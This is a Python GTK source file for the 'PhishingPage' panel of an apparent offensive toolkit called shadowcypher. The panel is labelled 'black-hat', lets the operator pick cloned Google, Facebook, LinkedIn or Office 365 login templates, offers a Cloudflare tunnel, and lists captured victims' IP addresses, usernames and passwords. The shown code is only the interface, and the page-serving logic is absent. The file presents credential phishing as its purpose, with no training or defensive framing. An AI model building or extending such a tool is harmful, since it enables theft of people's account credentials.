import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib
import json
from shadowcypher.core.logger import logger
from shadowcypher.core.bus import bus

class PhishingPage(Gtk.Box):
    def __init__(self):
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=20)
        self.set_margin_top(40)
        self.set_margin_start(40)
        self.set_margin_end(40)
        self.victims = []
        self._setup_ui()
        bus.subscribe("phish_victim_captured", self._on_victim_async)

    def _setup_ui(self):
        # Header
        header_hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        title_lbl = Gtk.Label()
        title_lbl.set_markup("<span size='xx-large' weight='bold' color='#facc15'>PHISHING FORGE: BLACK-HAT RECON</span>")
        header_hbox.pack_start(title_lbl, False, False, 0)
        
        self.status_lbl = Gtk.Label(label="FORGE_READY: Waiting for template ignition...")
        self.status_lbl.get_style_context().add_class("dim-text")
        header_hbox.pack_end(self.status_lbl, False, False, 0)
        self.add(header_hbox)

        self.add(Gtk.Separator(orientation=Gtk.Orientation.HORIZONTAL))

        # Main Layout
        main_hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=20)
        self.add(main_hbox)

        # 1. Forge Setting Area
        forge_settings = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=15)
        forge_settings.set_size_request(400, -1)
        forge_settings.get_style_context().add_class("terminal-box")
        forge_settings.set_margin_start(10)
        forge_settings.set_margin_end(10)
        forge_settings.set_margin_top(10)

        settings_header = Gtk.Label()
        settings_header.set_markup("<span weight='bold' color='#94a3b8'>// FORGE_SETTINGS</span>")
        settings_header.set_halign(Gtk.Align.START)
        forge_settings.pack_start(settings_header, False, False, 10)

        # Template Selection
        self.template_combo = Gtk.ComboBoxText()
        self.template_combo.append("google", "Google Login (v2)")
        self.template_combo.append("facebook", "Facebook (Standard)")
        self.template_combo.append("linkedin", "LinkedIn (HR Sweep)")
        self.template_combo.append("microsoft", "Office 365 (Enterprise)")
        self.template_combo.set_active_id("google")
        forge_settings.pack_start(self.template_combo, False, False, 5)

        # Tunnel Switch
        tunnel_hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        tunnel_lbl = Gtk.Label(label="IGNITE CLOUDFLARE TUNNEL (HTTPS)")
        self.tunnel_switch = Gtk.Switch()
        self.tunnel_switch.set_active(False)
        tunnel_hbox.pack_start(tunnel_lbl, False, False, 0)
        tunnel_hbox.pack_end(self.tunnel_switch, False, False, 0)
        forge_settings.pack_start(tunnel_hbox, False, False, 10)

        port_lbl = Gtk.Label(label="SERVICE_PORT: 8080 (Default)")
        port_lbl.get_style_context().add_class("dim-text")
        forge_settings.pack_start(port_lbl, False, False, 5)

        self.ignite_btn = Gtk.Button(label="IGNITE FORGE")
        self.ignite_btn.get_style_context().add_class("action-button")
        self.ignite_btn.connect("clicked", self._ignite_phish)
        forge_settings.pack_start(self.ignite_btn, False, False, 20)

        main_hbox.pack_start(forge_settings, False, False, 0)

        # 2. Live Victim Area
        victim_panel = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=10)
        victim_panel.get_style_context().add_class("terminal-box")
        
        victim_header = Gtk.Label()
        victim_header.set_markup("<span weight='bold' color='#94a3b8'>// LIVE_VICTIM_HARVEST</span>")
        victim_header.set_halign(Gtk.Align.START)
        victim_panel.pack_start(victim_header, False, False, 10)

        scroller = Gtk.ScrolledWindow()
        scroller.set_policy(Gtk.PolicyType.NEVER, Gtk.PolicyType.AUTOMATIC)
        self.victim_list = Gtk.ListBox()
        self.victim_list.set_selection_mode(Gtk.SelectionMode.NONE)
        self.victim_list.get_style_context().add_class("victim-list")
        scroller.add(self.victim_list)
        victim_panel.pack_start(scroller, True, True, 0)
        
        main_hbox.pack_end(victim_panel, True, True, 0)

    def _ignite_phish(self, btn):
        template = self.template_combo.get_active_id()
        use_tunnel = self.tunnel_switch.get_active()
        logger.info("phish", f"IGNITING_FORGE: Template={template} Tunnel={use_tunnel}")
        self.status_lbl.set_text(f"FORGE_ACTIVE: Serving {template} clone on port 8080...")

    def _on_victim_async(self, data):
        GLib.idle_add(self._on_victim, data)

    def _on_victim(self, data):
        self.victims.append(data)
        row = Gtk.ListBoxRow()
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=2)
        vbox.set_margin_top(10)
        vbox.set_margin_start(10)
        
        ip_lbl = Gtk.Label()
        ip_lbl.set_markup(f"<span weight='bold' color='#f87171'>VICTIM DETECTED: {data.get('ip')}</span>")
        ip_lbl.set_halign(Gtk.Align.START)
        vbox.pack_start(ip_lbl, False, False, 0)
        
        creds_lbl = Gtk.Label()
        creds_lbl.set_markup(f"<span weight='bold' color='#4ade80'>CREDENTIALS: {data.get('username')} / {data.get('password')}</span>")
        creds_lbl.set_halign(Gtk.Align.START)
        vbox.pack_start(creds_lbl, False, False, 0)
        
        ua_lbl = Gtk.Label()
        ua_lbl.set_markup(f"<span size='x-small' color='#94a3b8'>UA: {data.get('agent', 'Unknown')[:64]}...</span>")
        ua_lbl.set_halign(Gtk.Align.START)
        vbox.pack_start(ua_lbl, False, False, 0)
        
        row.add(vbox)
        self.victim_list.add(row)
        self.victim_list.show_all()

# For dynamic loading in app.py
# PhishingPage class is exported by default
